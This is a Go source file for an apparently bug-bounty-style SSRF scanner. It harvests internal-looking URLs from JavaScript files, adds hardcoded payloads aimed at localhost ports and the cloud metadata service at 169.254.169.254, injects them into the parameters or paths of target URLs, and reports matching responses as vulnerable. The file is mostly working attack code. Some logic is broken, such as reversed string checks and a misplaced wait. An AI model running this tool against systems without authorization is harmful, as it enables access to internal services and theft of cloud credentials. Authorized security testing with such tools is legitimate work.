package main

import (
"regexp"
"fmt"
"time"
"sync"
"bufio"
"os"
"strings"
"io/ioutil"
"net/http"
"net/url"
"flag"
"github.com/briandowns/spinner"
"github.com/projectdiscovery/gologger"
. "github.com/logrusorgru/aurora"
)


func main () {

	banner:=`


 _____ _____ _____ _____
|   __|   __| __  |   __|
|__   |__   |    -|   __|
|_____|_____|__|__|__|
    1.0 - @z0idsec

        `

	gologger.Printf("%s\n\n", banner)
	gologger.Infof("Use with caution. You are responsible for your actions\n")
	gologger.Infof("Developers assume no liability and are not responsible for any misuse or damage.\n\n")


	var concurrency int
	var payloads string
	var match string
	var appendMode bool
	var paths bool
	var silent bool
	var wordlist bool
	flag.IntVar(&concurrency, "c", 30, "Set the concurrency for greater speeds")
	flag.StringVar(&payloads, "pL", "", "The payloads list")
	flag.StringVar(&match, "m", "", "Match the response with a pattern (e.g.) 'Success:'")
	flag.BoolVar(&appendMode, "a", false, "Append the payload to the parameter")
	flag.BoolVar(&paths, "p", false, "(true or false) for testing paths or parameters")
	flag.BoolVar(&wordlist, "w", false, "Generate a SSRF wordlist to be used")
	flag.BoolVar(&silent, "s", false, "silent output")
	flag.Parse()

	if wordlist == true {
		
		// Generate the wordlist for ssrf testing
		generate_wordlist()

	}else {
		
		if (payloads != "" && match != "") {

         	        s := spinner.New(spinner.CharSets[9], 100*time.Millisecond)  // Build our new spinner
               		s.Suffix =" Please be patient"
                	s.Start()
                	s.Color("red") // Set the spinner color to red
                	time.Sleep(time.Second * 2)
                	s.Stop()
               		// Continue Create the goroutine
                	var wg sync.WaitGroup
                	for i:=0; i<=concurrency; i++ {
                       		wg.Add(1)
                        	go func () {
                                	test_ssrf(payloads, match, appendMode, silent, paths)
                                	wg.Done()
                        	}()
                        	wg.Wait()
                	}
		}
	}
}

// Generate the wordlist from javascript
func generate_wordlist() {

	s := spinner.New(spinner.CharSets[9], 100*time.Millisecond)  // Build our new spinner
	s.Suffix =" Generating SSRF wordlist"
        s.Start()
        s.Color("red") // Set the spinner color to red
        time.Sleep(time.Second * 2)
        s.Stop()

	payloads:=search_with_regex()
	fmt.Println(Sprintf(Cyan("Wordlist is %d lines"), Red(len(payloads))))
	save_wordlist(payloads)
}

// Save the wordlist
func save_wordlist(payloads []string) {
 	
	s := spinner.New(spinner.CharSets[9], 100*time.Millisecond)  // Build our new spinner
        s.Suffix =" Saving wordlist as ssrf.txt"
        s.Start()
        s.Color("red") // Set the spinner color to red
        time.Sleep(time.Second * 2)


	f,err:=os.Create("ssrf.txt")
	if err != nil {
		fmt.Println(Bold(Red(err)))
		return
	}
	for _,v := range payloads{
		fmt.Println(v)
		_,err := f.WriteString(v)
		if err != nil {
			fmt.Println(Bold(Red(err)))
			f.Close()
			return
		}
	}
	f.Close()
	s.Stop()
}

// Search through all javascript for domains
func search_with_regex() []string {

	var links=make([]string, 0)
	client:= &http.Client{}
	

	scanner:=bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		jsLink:=scanner.Text()
		req,err:=http.NewRequest("GET", jsLink,nil)
		if err != nil {
			return nil
		}

		resp,err:=client.Do(req)
		if err != nil {
			return nil
		}

		bodyBuffer,err:=ioutil.ReadAll(resp.Body)
		if err != nil {
			return nil
		}

		// The body to grep for
		bodyString:=string(bodyBuffer)

		// Search for all links
		re:=regexp.MustCompile(`(https?|ftp|file)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]`)
		matches:=re.FindStringSubmatch(bodyString)
		if matches != nil {

			// Check for internal domains in js
			if strings.Contains("internal", matches[0]) {
				links=append(links, matches[0] + "\n")
			}
			if strings.Contains("prod", matches[0]) {
                                links=append(links, matches[0] + "\n")
                        }
			if strings.Contains("internal", matches[0]) {
                                links=append(links, matches[0] + "\n")
                        }
			if strings.Contains("corp", matches[0]) {
                                links=append(links, matches[0] + "\n")
                        }
			if strings.Contains("uat", matches[0]) {
                                links=append(links, matches[0] + "\n")
                        }
		}
	}
	// Append some other payloads
        links=append(links, "http://example.com" + "\n")
        links=append(links, "http://127.0.0.1:80" + "\n")
        links=append(links, "http://127.0.0.1:443" + "\n")
        links=append(links, "http://127.0.0.1:22" + "\n")
        links=append(links, "https://localhost/admin" + "\n")
        links=append(links, "http://[::]:22/" + "\n")
        links=append(links, "http://169.254.169.254" + "\n")
        links=append(links, "http://169.254.169.254/computeMetadata/v1/" + "\n")
        links=append(links, "example.com" + "\n")
        links=append(links, "127.0.0.1:80" + "\n")
        links=append(links, "169.254.169.254/computeMetadata/v1/" + "\n")
        links=append(links, "127.0.0.1:443" + "\n")
        links=append(links, "127.0.0.1:22" + "\n")
        links=append(links, "localhost/admin" + "\n")
        links=append(links, "169.254.169.254" + "\n")
        links=append(links, "[::]:22/" + "\n")

	return links
}






// This is used to test for ssrf
func test_ssrf(payloads string, match string, appendMode bool, silent bool, paths bool) {
	
	payloadList :=make([]string, 0)
	links := make([]string, 0)

	file,err := os.Open(payloads)

	if err != nil {
		gologger.Errorf("File could not be read")
	}

	defer file.Close()

	time.Sleep(time.Millisecond * 10)
	scanner:=bufio.NewScanner(os.Stdin)
	pScanner:=bufio.NewScanner(file)
	
	s := spinner.New(spinner.CharSets[9], 100*time.Millisecond)  // Build our new spinner
        s.Suffix =" Generating links to test"
        s.Start()
        s.Color("red") // Set the spinner color to red
        time.Sleep(time.Second * 2)

	for {
		scanner.Scan()
		text:=scanner.Text()
		if len(text) != 0 {
			links = append(links,text)
		}else {
			break
		}
	}
	s.Stop()

	
        s1 := spinner.New(spinner.CharSets[9], 100*time.Millisecond)  // Build our new spinner
        s1.Suffix =" Generating Payloads from list"
        s1.Start()
        s1.Color("red") // Set the spinner color to red
        time.Sleep(time.Second * 2)

	for {

		pScanner.Scan()
                text:=pScanner.Text()
                if len(text) != 0 {
                       	payloadList = append(payloadList,text)
                }else {
                        break
                }

	}
	s1.Stop()

	for _,p:=range payloadList {
		for _,l:= range links {
			link:=l			
			payload:=p
			u,err := url.Parse(link)
			if err != nil {
				fmt.Println(Bold(Red(">")), err)
			}
			if paths == false {

				qs:=url.Values{}
				for param, vv := range u.Query() {
					if appendMode == true {
						qs.Set(param, vv[0]+payload)
						u.RawQuery = qs.Encode()
                  		              	if silent == false {
							 fmt.Println(Bold(Red(">")), Bold(White(" Testing ")), Bold(White(u)))
                                	      	}
                                		make_request(u.String(), match)

					}else {
						qs.Set(param, payload)

						u.RawQuery = qs.Encode()
                                		if silent == false {
							fmt.Println(Bold(Red(">")), Bold(White(" Testing ")), Bold(White(u)))
                                		}
        		                        make_request(u.String(), match)
					}
				}					

			}else {

				newLink:=link+"/"+payload
				if silent == false {
					fmt.Println(Bold(Red(">")), Bold(White(" Testing ")), Bold(White(newLink)))
                                }
                                make_request(newLink, match)

			}
		}
	}
	os.Exit(1)
}


// Making a request checking the output for vulnerabilities
func make_request(url string, match string) {
	
	client:=&http.Client{}
	req,err:=http.NewRequest("GET", url, nil)
	if err != nil {
		return
	}
	
	resp,err:=client.Do(req)
	if err != nil {
		return
	}

	if match != "" {

		bodyBytes,err  := ioutil.ReadAll(resp.Body)
		if err != nil {
			return
		}
		bodyString := string(bodyBytes)
		if strings.Contains(bodyString, match) {
			fmt.Println(Bold(Cyan(bodyString)))
			fmt.Println(Bold(Red("VULNERABLE: " + url)))
		}
	}
}
